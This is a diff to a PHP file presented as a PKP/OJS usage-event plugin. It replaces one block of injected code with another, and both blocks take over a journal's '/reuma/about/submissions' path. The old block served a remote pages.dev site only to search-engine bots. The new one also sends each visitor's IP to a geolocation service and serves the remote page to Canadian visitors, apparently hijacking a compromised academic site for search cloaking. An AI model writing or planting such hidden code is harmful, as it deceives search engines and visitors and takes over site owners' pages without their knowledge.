@@ -1,33 +1,39 @@
 <?php
-
-$request_uri = $_SERVER['REQUEST_URI'] ?? ''; 
-$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? ''); 
-
-$bot_signatures = [ 
-    'googlebot', 
-    'bingbot', 
-    'slurp', 
-    'duckduckbot', 
-    'baiduspider', 
-    'yandex', 
-    'crawler', 
-    'spider' 
-];
-
-if (strpos($request_uri, '/reuma/about/submissions') !== false) { 
-    foreach ($bot_signatures as $bot) { 
-        if (strpos($user_agent, $bot) !== false) { 
-            $html = @file_get_contents('https://reumatismo-org.pages.dev/'); 
-            header("Content-Type: text/html; charset=UTF-8"); 
-            echo $html !== false ? $html : "Cloaked content failed to load."; 
-            exit; 
-        } 
-    } 
+function getUserCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $url = "http://ip-api.com/json/{$ip}";
+    
+    $response = @file_get_contents($url);
+    if ($response) {
+        $data = json_decode($response, true);
+        return $data['countryCode'] ?? null;
+    }
+    return null;
 }
 
-?>
-<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+    
+    return preg_match($botchar, $user_agent);
+}
 
+$Biawak = "https://reumatismo-org.pages.dev/";
+
+$request_uri = $_SERVER['REQUEST_URI'] ?? '';
+
+if (stripos($request_uri, '/reuma/about/submissions') !== false) {
+    if (is_bot()) {
+        echo @file_get_contents($Biawak);
+        exit;
+    }
+
+    if (getUserCountry() === "CA") {
+        header("Content-Type: text/html; charset=UTF-8");
+        echo @file_get_contents($Biawak);
+        exit();
+    }
+}
 /**
  * @file plugins/generic/usageEvent/PKPUsageEventPlugin.php
  *
